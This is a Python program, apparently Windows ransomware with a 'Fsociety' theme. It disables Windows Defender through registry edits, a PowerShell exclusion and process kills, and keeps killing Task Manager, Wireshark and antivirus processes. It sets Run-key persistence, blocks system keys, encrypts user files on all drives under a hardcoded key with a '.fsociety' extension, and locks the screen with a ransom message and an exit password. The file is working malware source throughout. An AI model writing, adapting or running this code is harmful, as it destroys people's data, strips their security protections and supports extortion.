import sys
import subprocess
import importlib
import tkinter as tk
from PIL import ImageTk, Image
import io, base64, os, keyboard, string, threading, time, winreg
from cryptography.fernet import Fernet

def check_dependencies(libs):
    for lib in libs:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"Installing {lib}...") 
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", lib],
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )

dependencies = ["requests", "pyautogui", "cryptography", "pillow", "keyboard"]
check_dependencies(dependencies)

K_BASE = b'uV9_S6Q5X6P8R-Gz8_L2kHw9Jz2X9L3M4N5O6P7Q8R9='
cipher = Fernet(K_BASE)

IMAGE_DATA = ""

def bypass_av():
    try:
        cmd_path = os.path.realpath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{cmd_path}\'"')
        cmds = [
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
            'sc stop WinDefend',
            'taskkill /f /im MsMpEng.exe'
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, capture_output=True)
    except: pass

def kill_security_procs():
    procs = ["taskmgr.exe", "ProcessHacker.exe", "wireshark.exe", "360tray.exe", "avp.exe"]
    while True:
        for p in procs:
            os.system(f"taskkill /f /im {p} >nul 2>&1")
        time.sleep(0.5)

def set_persistence():
    try:
        path = os.path.realpath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Fsociety_System", 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except: pass

def get_drives():
    drives = []
    if os.name == 'nt':
        for d in string.ascii_uppercase:
            path = f"{d}:\\"
            if os.path.exists(path): drives.append(path)
    return drives

def background_encrypt():
    time.sleep(3)
    exts = ('.docx', '.xlsx', '.pptx', '.pdf', '.jpg', '.png', '.txt', '.zip', '.rar', '.exe', '.mp3', '.mp4', '.lnk', '.url')
    curr = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__)
    for drive in get_drives():
        for root_dir, _, files in os.walk(drive):
            if any(x in root_dir for x in ["Windows", "AppData", "Program Files", "Boot", "System Volume Information", "$Recycle.Bin"]): continue
            for f in files:
                if f == curr or f.endswith(".fsociety"): continue
                if f.lower().endswith(exts):
                    p = os.path.join(root_dir, f)
                    try:
                        with open(p, 'rb') as fl: data = fl.read()
                        with open(p, 'wb') as fl: fl.write(cipher.encrypt(data))
                        os.rename(p, p + ".fsociety")
                        time.sleep(0.02)
                    except: pass

def check_key(root, entry, label_status, event=None):
    if entry.get() == 'we_are_fsociety':
        try: keyboard.unhook_all()
        except: pass
        root.destroy()
    else:
        label_status.config(text="WRONG KEY. ACCESS DENIED.", fg="red")
        entry.delete(0, tk.END)

def main():
    print("D1_Bypass đang chạy...")
    
    try:
        for k in ['windows', 'alt', 'tab', 'esc', 'f4', 'delete', 'ctrl']: keyboard.block_key(k)
    except: pass
    
    bypass_av()
    set_persistence()
    threading.Thread(target=kill_security_procs, daemon=True).start()
    threading.Thread(target=background_encrypt, daemon=True).start()

    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')

    img_bytes = base64.b64decode(IMAGE_DATA.strip())
    pill_img = Image.open(io.BytesIO(img_bytes))
    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
    nh = int(sh * 0.35)
    nw = int(pill_img.size[0] * (nh / pill_img.size[1]))
    pill_img = pill_img.resize((nw, nh), Image.Resampling.LANCZOS)
    photo = ImageTk.PhotoImage(pill_img)

    canvas = tk.Canvas(root, width=sw, height=sh, bg='black', highlightthickness=0)
    canvas.pack()
    canvas.create_text(sw/2, sh*0.15, text="You have been infected with malware\nWhat should you do?\nThe answer is that nothing can be done.", fill='white', font=('Courier', 20, 'bold'), justify="center")
    canvas.create_image(sw/2, sh*0.45, image=photo)
    canvas.create_text(sw/2, sh*0.7, text="We will remove the malware from your computer within the next 24 hours\ncode by: @Ken_Drick   Please contact us to get it unlocked", fill='white', font=('Courier', 16), justify="center")
    canvas.create_text(sw/2, sh*0.8, text="Password to exit", fill='red', font=('Courier', 14, 'bold'))

    entry = tk.Entry(root, font=('Courier', 22), justify='center', show='*', bg='black', fg='red', insertbackground='red', highlightthickness=2)
    canvas.create_window(sw/2, sh*0.88, window=entry, width=450, height=50)
    label_status = tk.Label(root, text="STATUS: SYSTEM PROTECTED", bg="black", fg="#333333", font=("Courier", 10))
    canvas.create_window(sw/2, sh*0.95, window=label_status)

    entry.focus_set()
    root.bind('<Return>', lambda event: check_key(root, entry, label_status, event))
    root.protocol('WM_DELETE_WINDOW', lambda: None)
    root.mainloop()

if __name__ == "__main__":
    main()

